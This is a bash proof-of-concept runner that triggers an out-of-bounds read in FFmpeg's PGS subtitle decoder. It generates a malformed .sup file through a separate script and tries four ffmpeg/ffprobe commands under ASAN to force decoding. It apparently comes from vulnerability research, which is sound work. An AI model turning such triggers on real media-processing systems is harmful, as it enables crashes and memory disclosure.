#!/usr/bin/env bash
# vuln_001_run.sh - Run PoC for VULN 001 (CWE-125 OOB Read in pgssubdec.c)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
FFPROBE="$(dirname "$FFMPEG")/ffprobe"
SUP_FILE="$SCRIPT_DIR/vuln_001.sup"

echo "=== VULN 001 PoC: CWE-125 OOB Read in parse_presentation_segment() ==="
echo "=== File: libavcodec/pgssubdec.c lines 449-468 ==="
echo ""

# Step 1: Generate the malformed SUP file
echo "[*] Generating malformed PGS SUP file..."
python3 "$SCRIPT_DIR/vuln_001_gen.py"
echo ""

# Step 2: Verify the file was created
if [ ! -f "$SUP_FILE" ]; then
    echo "[-] ERROR: SUP file not created"
    exit 1
fi
echo "[*] SUP file: $SUP_FILE ($(wc -c < "$SUP_FILE") bytes)"
echo ""

# ASAN options: no abort so we capture all output
export ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:detect_leaks=0:print_stats=0"

# -----------------------------------------------------------------------
# Method 1: overlay_graphicsub filter
# Use a synthetic black video + the SUP subtitle file in a filter graph.
# [0:v][1:s]overlay_graphicsub forces the PGS subtitle decoder to run
# (avcodec_decode_subtitle2 -> parse_presentation_segment -> OOB read).
# -----------------------------------------------------------------------
echo "[*] Method 1: overlay_graphicsub filter to force PGS decoding..."
echo "[*] Command: $FFMPEG -f lavfi -i color=black:size=1920x1080:rate=1 -i SUP ..."
echo ""
"$FFMPEG" -y \
    -f lavfi -i "color=black:size=1920x1080:rate=1:duration=0.1" \
    -i "$SUP_FILE" \
    -filter_complex "[0:v][1:s]overlay_graphicsub[v]" \
    -map "[v]" \
    -frames:v 1 \
    -f null - 2>&1
FFMPEG_EXIT1=$?
echo ""
echo "[*] ffmpeg exit code (method 1): $FFMPEG_EXIT1"

# -----------------------------------------------------------------------
# Method 2: ffprobe -show_frames forces avcodec_decode_subtitle2 calls
# (now SUP file has 10 packets for a better probe score)
# -----------------------------------------------------------------------
echo ""
echo "[*] Method 2: ffprobe -show_frames to force subtitle decoding..."
if [ -f "$FFPROBE" ]; then
    "$FFPROBE" -v warning -show_frames -select_streams s:0 "$SUP_FILE" 2>&1
    FFPROBE_EXIT=$?
    echo "[*] ffprobe exit code: $FFPROBE_EXIT"
fi

# -----------------------------------------------------------------------
# Method 3: PGS -> DVB subtitle bitmap-to-bitmap transcode (forces decode)
# This calls the pgssub decoder on each PCS packet.
# -----------------------------------------------------------------------
echo ""
echo "[*] Method 3: Bitmap-to-bitmap transcode PGS->dvbsub (forces decode)..."
"$FFMPEG" -y \
    -f lavfi -i "color=black:size=1920x1080:rate=1:duration=5" \
    -i "$SUP_FILE" \
    -map 0:v -map 1:s \
    -c:v libx264 -c:s dvbsub \
    -f mpegts /tmp/vuln_001_out.ts 2>&1
FFMPEG_EXIT3=$?
echo "[*] ffmpeg exit code (method 3): $FFMPEG_EXIT3"

# -----------------------------------------------------------------------
# Method 4: Try direct PGS re-encode into another container
# -----------------------------------------------------------------------
echo ""
echo "[*] Method 4: Transcode PGS subtitles directly..."
"$FFMPEG" -y -i "$SUP_FILE" -map 0:s:0 -c:s dvb_subtitle -f mpegts /tmp/vuln_001_out2.ts 2>&1
FFMPEG_EXIT4=$?
echo "[*] ffmpeg exit code (method 4): $FFMPEG_EXIT4"

echo ""
echo "=== END ==="

echo ""
echo "[*] ffmpeg exit code: $FFMPEG_EXIT"
echo "=== END ==="
